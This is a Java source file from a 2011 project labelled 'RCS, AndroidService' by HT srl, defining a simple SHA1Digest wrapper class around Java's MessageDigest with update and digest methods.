/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : SHA1Digest.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.crypto;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

import com.android.service.auto.Cfg;

// TODO: Auto-generated Javadoc
/**
 * The Class SHA1Digest.
 */
public class SHA1Digest {

	/** The digest. */
	MessageDigest digest;

	/**
	 * Instantiates a new sH a1 digest.
	 */
	public SHA1Digest() {

		try {
			digest = MessageDigest.getInstance("SHA-1");
		} catch (final NoSuchAlgorithmException e) {

			if(Cfg.DEBUG) { e.printStackTrace(); }
		}

	}

	/**
	 * Update.
	 * 
	 * @param message
	 *            the message
	 * @param offset
	 *            the offset
	 * @param length
	 *            the length
	 */
	public void update(final byte[] message, final int offset, final int length) {
		digest.update(message, offset, length);
	}

	/**
	 * Gets the digest.
	 * 
	 * @return the digest
	 */
	public byte[] getDigest() {
		return digest.digest();
	}

	/**
	 * Update.
	 * 
	 * @param message
	 *            the message
	 */
	public void update(final byte[] message) {
		digest.update(message, 0, message.length);
	}

}
